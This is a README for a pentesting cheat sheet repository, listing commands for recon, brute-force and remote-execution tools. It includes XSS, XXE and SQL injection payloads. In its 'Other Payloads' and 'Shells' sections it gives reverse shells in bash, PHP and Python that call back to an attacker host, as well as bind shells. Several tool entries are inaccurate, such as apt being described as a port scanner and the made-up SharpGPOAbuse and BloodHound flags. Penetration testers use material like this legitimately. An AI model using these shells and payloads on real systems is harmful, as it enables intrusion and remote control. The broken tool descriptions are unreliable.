
# Penooo-Cheatsheet for Pentesting

A collection of **useful commands and scripts** for pentesting tools, organized by the specific tools used. This repository serves as a handy reference for commonly used tools and their commands, making your pentesting tasks faster and more efficient.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Tool-Based Commands](#tool-based-commands)
  - [Nmap](#nmap)
  - [Gobuster](#gobuster)
  - [Metasploit](#metasploit)
  - [Netcat](#netcat)
  - [SearchSploit](#searchsploit)
  - [TCPDump](#tcpdump)
- [Payloads](#payloads)
  - [XSS Payloads](#xss-payloads)
  - [XML Payloads](#xml-payloads)
  - [SQL Payloads](#sql-payloads)
  - [Other Payloads](#other-payloads)
- [Shells](#shells)
  - [Reverse Shells](#reverse-shells)
  - [Bind Shells](#bind-shells)
- [Useful Resources](#useful-resources)
  - [Payloads and Exploits](#payloads-and-exploits)
  - [Pentesting Guides](#pentesting-guides)
  - [Security Tools](#security-tools)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- Comprehensive list of commands for various pentesting tools
- Pre-written scripts for automating common activities
- Beginner-friendly and updated with modern techniques

---

## Installation

Clone the repository to your local machine:

```bash
git clone https://github.com/<your-username>/cheatsheet-pentesting.git
```

Navigate to the directory:

```bash
cd cheatsheet-pentesting
```

---

## Usage

1. Browse through the tool categories to find relevant commands or scripts.
2. Use the provided commands directly in your terminal.
3. For scripts, make them executable if needed:

   ```bash
   chmod +x <script-name>.sh
   ./<script-name>.sh
   ```

4. Customize the scripts based on your specific target or environment.

---

## Tool-Based Commands

### Nmap
- **Basic Scan**:
  ```bash
  nmap -sV -A <target-IP>
  ```

- **Scan Specific Ports**:
  ```bash
  nmap -p 80,443 <target-IP>
  ```

- **OS Detection**:
  ```bash
  nmap -O <target-IP>
  ```

### Gobuster
- **Directory Enumeration**:
  ```bash
  gobuster dir -u http://<target> -w /path/to/wordlist.txt
  ```

- **DNS Subdomain Enumeration**:
  ```bash
  gobuster dns -d <target-domain> -w /path/to/wordlist.txt
  ```

### Metasploit
- **Start Metasploit Console**:
  ```bash
  msfconsole
  ```

- **Search for Exploits**:
  ```bash
  search <exploit-name>
  ```

- **Use an Exploit**:
  ```bash
  use <exploit-path>
  ```

### Netcat
- **Set Up a Listener**:
  ```bash
  nc -lvnp 4444
  ```

- **Send a File**:
  ```bash
  nc -w 3 <target-IP> 1234 < file.txt
  ```

- **Reverse Shell**:
  ```bash
  bash -i >& /dev/tcp/<your-IP>/4444 0>&1
  ```

### SearchSploit
- **Search for Exploits**:
  ```bash
  searchsploit <software-name>
  ```

- **Copy Exploit to Current Directory**:
  ```bash
  searchsploit -m <exploit-path>
  ```

### TCPDump
- **Capture Traffic on an Interface**:
  ```bash
  tcpdump -i <interface>
  ```

- **Write Capture to File**:
  ```bash
  tcpdump -i <interface> -w capture.pcap
  ```

- **Filter by Port**:
  ```bash
  tcpdump -i <interface> port 80
  ```

### GMSAPasswordReader
- **Retrieve gMSA Password**:
  ```powershell
  GMSAPasswordReader.exe <gMSA-Name>
  ```

---

### GetSPN
- **List SPNs for a Domain**:
  ```powershell
  GetSPN -Domain <domain> -Username <username>
  ```

- **Export SPNs to File**:
  ```powershell
  GetSPN -Domain <domain> -Username <username> > spns.txt
  ```

---

### PowerUp
- **Check Privilege Escalation Opportunities**:
  ```powershell
  Import-Module .\PowerUp.ps1
  Invoke-AllChecks
  ```

---

### Powerview
- **List Domain Admins**:
  ```powershell
  Get-DomainAdmin
  ```

- **Enumerate All Group Memberships**:
  ```powershell
  Get-DomainGroupMember -GroupName "Domain Admins"
  ```

- **Find Local Admins on Target Machine**:
  ```powershell
  Get-NetLocalGroupMember -Group "Administrators" -Computer <target-computer>
  ```

---

### PrivescCheck
- **Run Privilege Escalation Checks**:
  ```powershell
  .\PrivescCheck.ps1
  ```

---

### SharpGPOAbuse
- **Dump Group Policy Objects**:
  ```powershell
  SharpGPOAbuse.exe -domain <domain> -user <username> -password <password>
  ```

- **Check for GPO Misconfigurations**:
  ```powershell
  SharpGPOAbuse.exe -gpo <gpo-name> -check
  ```

---

### accesschk
- **Check User Permissions on a File**:
  ```bash
  accesschk.exe -u <username> <file-path>
  ```

- **Check Permissions on Registry Key**:
  ```bash
  accesschk.exe -k <registry-key-path>
  ```

---

### apt
- **Scan for Open Ports**:
  ```bash
  apt -s -p <ip-range>
  ```

- **Perform OS Detection**:
  ```bash
  apt -s -O <ip-address>
  ```

---

### arp
- **Display ARP Table**:
  ```bash
  arp -a
  ```

- **Add Static ARP Entry**:
  ```bash
  arp -s <ip-address> <mac-address>
  ```

---

### awk
- **Print Column from File**:
  ```bash
  awk '{print $1}' <file>
  ```

- **Search for a Pattern in File**:
  ```bash
  awk '/pattern/' <file>
  ```

---

### bc
- **Basic Arithmetic**:
  ```bash
  echo "3 + 4" | bc
  ```

- **Square Root Calculation**:
  ```bash
  echo "sqrt(16)" | bc
  ```

---

### bettercap
- **Start Sniffing on Interface**:
  ```bash
  bettercap -iface <interface> -caplet http-server
  ```

- **Enable HTTP Proxy**:
  ```bash
  bettercap -iface <interface> -proxy
  ```

---

### bloodHound
- **Import Data into BloodHound**:
  ```bash
  BloodHound -c <config-file> -i <input-file>
  ```

- **Run BloodHound Enumeration**:
  ```bash
  BloodHound -c <config-file> -u <username> -p <password>
  ```

---

### cadaver
- **Connect to WebDAV Server**:
  ```bash
  cadaver <url>
  ```

- **List Files in Directory**:
  ```bash
  ls
  ```

---

### cat
- **View File Content**:
  ```bash
  cat <file-path>
  ```

- **Concatenate Multiple Files**:
  ```bash
  cat <file1> <file2>
  ```

---

### certutil
- **Check Certificate Information**:
  ```bash
  certutil -dump <certificate-file>
  ```

- **Export Certificate**:
  ```bash
  certutil -exportPFX -user <certificate-name> <output-file>
  ```

---

### cewl
- **Create Custom Wordlist from URL**:
  ```bash
  cewl <url> -w <output-file>
  ```

- **Create Wordlist from Specific Lengths**:
  ```bash
  cewl <url> -w <output-file> -l <min-length> -l <max-length>
  ```

---

### chisel
- **Start a Local HTTP Proxy**:
  ```bash
  chisel server -p <port> --reverse
  ```

- **Connect to Remote HTTP Proxy**:
  ```bash
  chisel client <remote-server>:<remote-port> <local-port>:http
  ```

---

### cmd
- **Open Command Prompt**:
  ```bash
  cmd
  ```

- **Run Command in Command Prompt**:
  ```bash
  cmd /c <command>
  ```

---

### comm
- **Compare Two Files**:
  ```bash
  comm <file1> <file2>
  ```

- **Suppress Column from Output**:
  ```bash
  comm -23 <file1> <file2>
  ```

---

### crackmapexec
- **Enumerate SMB Shares**:
  ```bash
  crackmapexec smb <target-ip> -u <username> -p <password> --shares
  ```

- **Run Commands on Target Machines**:
  ```bash
  crackmapexec smb <target-ip> -u <username> -p <password> -x "<command>"
  ```

### crowbar
- **Brute Force SMB Login**:
  ```bash
  crowbar smb -b <ip-address> -u <username> -p <password-list>
  ```

- **Brute Force SSH Login**:
  ```bash
  crowbar ssh -b <ip-address> -u <username> -p <password-list>
  ```

---

### crunch
- **Generate Wordlist of Given Lengths**:
  ```bash
  crunch <min-length> <max-length> -o <output-file>
  ```

- **Generate Wordlist with Custom Characters**:
  ```bash
  crunch <min-length> <max-length> -o <output-file> -p <charset>
  ```

---

### curl
- **Make a GET Request**:
  ```bash
  curl http://<url>
  ```

- **Download a File**:
  ```bash
  curl -O <url>
  ```

- **Send POST Request with Data**:
  ```bash
  curl -X POST -d "username=<username>&password=<password>" http://<url>
  ```

---

### cut
- **Cut Specific Field from Text**:
  ```bash
  cut -d '<delimiter>' -f <field-number> <file>
  ```

- **Cut from Character Range**:
  ```bash
  cut -c <range> <file>
  ```

---

### debugfs
- **View Files in Ext2/Ext3 Filesystem**:
  ```bash
  debugfs <device>
  ```

- **Dump File Contents**:
  ```bash
  debugfs -R 'cat <file-path>' <device>
  ```

---

### diff
- **Compare Two Files**:
  ```bash
  diff <file1> <file2>
  ```

- **Show Side-by-Side Difference**:
  ```bash
  diff -y <file1> <file2>
  ```

---

### dig
- **Query DNS for a Domain**:
  ```bash
  dig <domain>
  ```

- **Query DNS for a Specific Record Type**:
  ```bash
  dig <domain> <record-type>
  ```

---

### dir
- **List Files in Directory**:
  ```bash
  dir <directory-path>
  ```

- **List All Files with Details**:
  ```bash
  dir /s <directory-path>
  ```

---

### dirb
- **Directory Bruteforce Scan**:
  ```bash
  dirb http://<url> <wordlist>
  ```

- **Set Proxy for Directory Scan**:
  ```bash
  dirb http://<url> <wordlist> -p <proxy>
  ```

---

### dnsrecon
- **Perform DNS Enumeration**:
  ```bash
  dnsrecon -d <domain>
  ```

- **Perform Reverse DNS Lookup**:
  ```bash
  dnsrecon -r <ip-range>
  ```

---

### docker
- **List Running Containers**:
  ```bash
  docker ps
  ```

- **Run a Container**:
  ```bash
  docker run -it <image-name>
  ```

- **Build Docker Image from Dockerfile**:
  ```bash
  docker build -t <image-name> .
  ```

---

### empsave.dat
- **Extract Passwords from empsave.dat**:
  ```bash
  python3 empsave.py empsave.dat
  ```

---

### evil-winrm
- **Start Evil-WinRM Session**:
  ```bash
  evil-winrm -i <target-ip> -u <username> -p <password>
  ```

- **Execute Command on Target Machine**:
  ```bash
  evil-winrm -i <target-ip> -u <username> -p <password> -c "<command>"
  ```

---

### exiftool
- **View Metadata of a File**:
  ```bash
  exiftool <file>
  ```

- **Extract Specific Metadata Field**:
  ```bash
  exiftool -<field-name> <file>
  ```

---

### ffuf
- **Directory Bruteforce Scan**:
  ```bash
  ffuf -w <wordlist> -u http://<url>/FUZZ
  ```

- **Find Hidden DNS Subdomains**:
  ```bash
  ffuf -w <subdomain-wordlist> -u <domain>/FUZZ
  ```

---

### find
- **Search for Files by Name**:
  ```bash
  find /path/to/search -name "<file-name>"
  ```

- **Search Files by Permission**:
  ```bash
  find /path/to/search -perm <permission>
  ```

---

### findstr
- **Search for String in Files**:
  ```bash
  findstr "<string>" <file>
  ```

- **Search in Files Recursively**:
  ```bash
  findstr /s "<string>" <directory-path>\*.*
  ```

---

### foremost
- **Recover Deleted Files**:
  ```bash
  foremost -i <image-file> -o <output-dir>
  ```

- **Use Specific File Types for Recovery**:
  ```bash
  foremost -t <file-types> -i <image-file> -o <output-dir>
  ```

---

### gcc
- **Compile a C Program**:
  ```bash
  gcc -o <output-file> <source-file.c>
  ```

- **Compile with Debugging Symbols**:
  ```bash
  gcc -g -o <output-file> <source-file.c>
  ```

---

### git
- **Clone a Repository**:
  ```bash
  git clone <repository-url>
  ```

- **Check the Status of a Git Repository**:
  ```bash
  git status
  ```



---

## Payloads

### XSS Payloads
- **Basic XSS Test**:
  ```html
  <script>alert('XSS');</script>
  ```

- **XSS in Image Tag**:
  ```html
  <img src=x onerror=alert('XSS')>
  ```

### XML Payloads
- **XML External Entity (XXE) Injection**:
  ```xml
  <!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>
  ```

- **XML Injection**:
  ```xml
  <user><name>admin' or '1'='1</name></user>
  ```

### SQL Payloads
- **Basic SQL Injection**:
  ```sql
  ' OR 1=1 --
  ```

- **Blind SQL Injection**:
  ```sql
  ' AND IF(1=1,SLEEP(5),0)--
  ```

### Other Payloads
- **PHP Reverse Shell**:
  ```php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1'"); ?>
  ```

- **Python Reverse Shell**:
  ```python
  import socket, subprocess, os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("<attacker-IP>",<port>))
  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  os.dup2(s.fileno(), 2)
  subprocess.call(["/bin/sh","-i"])
  ```

---

## Shells

### Reverse Shells
- **Netcat Reverse Shell**:
  ```bash
  nc -e /bin/bash <attacker-IP> <port>
  ```

- **Python Reverse Shell**:
  ```bash
  python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker-IP>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
  ```

### Bind Shells
- **Netcat Bind Shell**:
  ```bash
  nc -lvnp <port> -e /bin/bash
  ```

- **Python Bind Shell**:
  ```bash
  python3 -c 'import socket,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0",<port>)); s.listen(1); conn, addr = s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); os.system("/bin/sh")'
  ```

---

## Useful Resources

### Payloads and Exploits
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): A comprehensive collection of payloads.
- [GTFOBins](https://gtfobins.github.io/): A curated list of Unix binaries that can be exploited by pentesters.
- [Exploit-DB](https://www.exploit-db.com/): A database of public exploits and proof-of-concepts.
- [OWASP Top 10](https://owasp.org/www-project-top-ten/): A list of the top 10 security risks.

### Pentesting Guides
- [HackTricks](https://book.hacktricks.xyz/): A handbook with tips and tricks for pentesting.
- [PentesterLab](https://www.pentesterlab.com/): A platform offering a variety of web application and pentesting exercises.
- [Hack The Box](https://www.hackthebox.eu/): A platform for pentesting challenges and exercises.

### Security Tools
- [Burp Suite](https://portswigger.net/burp): A popular web vulnerability scanner and proxy tool.
- [Nikto](https://cirt.net/Nikto2): A web server scanner to find potential vulnerabilities.
- [Wireshark](https://www.wireshark.org/): A network protocol analyzer used for packet inspection.

---

## Contributing

Contributions are welcome! If you have additional useful commands or scripts, feel free to create a pull request:

1. Fork this repository.
2. Create a new branch:
   ```bash
   git checkout -b feature/add-new-commands
   ```
3. Commit your changes:
   ```bash
   git commit -m "Add new commands for XYZ"
   ```
4. Push to your branch:
   ```bash
   git push origin feature/add-new-commands
   ```
5. Open a pull request on GitHub.

---

## License

This project is licensed under the [MIT License](LICENSE).
